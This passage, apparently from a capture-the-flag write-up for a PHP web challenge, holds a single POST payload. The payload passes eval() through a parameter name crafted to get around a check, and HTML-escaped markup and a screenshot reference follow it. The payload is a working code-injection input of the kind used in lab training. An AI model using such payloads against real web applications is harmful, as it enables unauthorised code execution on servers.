#POST
CTF[SHOW.COM=1&amp;amp;CTF_SHOW=1&amp;amp;fun=eval($a[1])
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812160549728.png&#34; alt=&#34;image-20250812160549728&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
